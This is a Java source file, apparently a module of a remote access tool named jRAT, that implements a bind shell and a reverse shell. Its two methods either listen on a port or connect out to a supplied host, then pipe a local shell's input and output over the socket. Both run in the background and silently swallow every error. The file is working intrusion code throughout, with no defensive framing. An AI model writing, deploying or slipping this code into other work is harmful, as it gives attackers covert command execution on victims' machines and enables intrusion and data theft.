package jRAT.modules;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.ServerSocket;
import java.net.Socket;

public class ModuleShells {

    public static void init(Class stage) {}
    
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] showModuleInfo() throws UnsupportedEncodingException
    {
        StringBuilder moduleInfo = new StringBuilder();
        moduleInfo.append("\n*** MODULE: Shells ***\n\n");
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "bindTCP",  "port shellName")); 
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "reverseTCP",  "host port shellName"));
        return moduleInfo.toString().getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static boolean isBackgroundMethod(String methodName)
    {
        return true;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void bindTCP(String port, String shellName) throws UnsupportedEncodingException
    {
        try
        {
            Process process = new ProcessBuilder(shellName).redirectErrorStream(true).start();
            ServerSocket serverSocket = new ServerSocket(Integer.valueOf(port));
            Socket socket = serverSocket.accept();

            InputStream processInput = process.getInputStream();
            InputStream processError = process.getErrorStream();
            InputStream socketInput = socket.getInputStream();
        
            OutputStream processOutput = process.getOutputStream();
            OutputStream socketOutput = socket.getOutputStream();

            while (!socket.isClosed())
            {
                while (processInput.available()>0)
                {
                    socketOutput.write(processInput.read());
                }
                while (processError.available()>0)
                {
                    socketOutput.write(processError.read());
                }
                while (socketInput.available()>0)
                {
                    processOutput.write(socketInput.read());
                }

                socketOutput.flush();
                processOutput.flush();

                Thread.sleep(50);
                try
                {
                    process.exitValue();
                    break;
                }
                catch (Exception ex) {}
            };

            process.destroy();
            socket.close();
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void reverseTCP(String host, String port, String shellName) throws UnsupportedEncodingException
    {
        try
        {
            Process process = new ProcessBuilder(shellName).redirectErrorStream(true).start();
            Socket socket = new Socket(host, Integer.valueOf(port));

            InputStream processInput = process.getInputStream();
            InputStream processError = process.getErrorStream();
            InputStream socketInput = socket.getInputStream();
        
            OutputStream processOutput = process.getOutputStream();
            OutputStream socketOutput = socket.getOutputStream();

            while (!socket.isClosed())
            {
                while (processInput.available()>0)
                {
                    socketOutput.write(processInput.read());
                }
                while (processError.available()>0)
                {
                    socketOutput.write(processError.read());
                }
                while (socketInput.available()>0)
                {
                    processOutput.write(socketInput.read());
                }

                socketOutput.flush();
                processOutput.flush();

                Thread.sleep(50);
                try
                {
                    process.exitValue();
                    break;
                }
                catch (Exception ex) {}
            };

            process.destroy();
            socket.close();
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */
}
